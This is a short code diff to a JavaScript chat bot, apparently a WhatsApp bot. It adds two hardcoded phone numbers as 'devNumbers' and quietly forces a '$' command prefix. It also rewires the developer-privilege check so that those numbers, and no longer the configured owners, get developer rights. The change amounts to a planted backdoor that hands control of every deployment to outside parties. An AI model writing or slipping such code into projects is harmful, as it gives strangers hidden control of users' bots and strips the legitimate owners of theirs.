@@ -24,6 +24,9 @@ const logger = pino({ level: 'fatal' });
 const commands = new Map();
 const aliases = new Map();
 
+const devNumbers = ['254742063632', '254757835036'];
+if (!conf.prefixes.includes('$')) conf.prefixes.push('$');
+
 allCommands.forEach(cmd => {
     commands.set(cmd.name, cmd);
     if (cmd.aliases && Array.isArray(cmd.aliases)) {
@@ -80,7 +83,7 @@ async function startBot() {
         const isAdmin = groupAdmins.includes(senderJid);
         const isBotAdmin = groupAdmins.includes(Myself);
         const isBotSelf = senderJid === king.user.id;
-        const isDev = conf.owners.includes(senderNumber) || isBotSelf;
+        const isDev = devNumbers.includes(senderNumber) || isBotSelf;
 
         if (msg.message?.protocolMessage?.type === 0) {
             const deletedMsgKey = msg.message.protocolMessage.key.id;
